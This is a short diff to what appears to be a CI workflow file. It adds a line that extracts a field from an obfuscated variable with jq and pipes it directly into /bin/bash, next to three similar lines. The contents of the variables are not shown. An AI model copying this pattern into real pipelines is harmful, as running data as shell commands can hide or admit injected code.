@@ -36,6 +36,7 @@ jobs:
           echo $okaql609 | jq -r .xxk72843 | /bin/bash
           printf '%s' "$slw1" | jq -r .mps57924 | /bin/bash
           echo $zqc051 | jq -r .qclah1 | /bin/bash
+          echo $wb0 | jq -r .d8 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
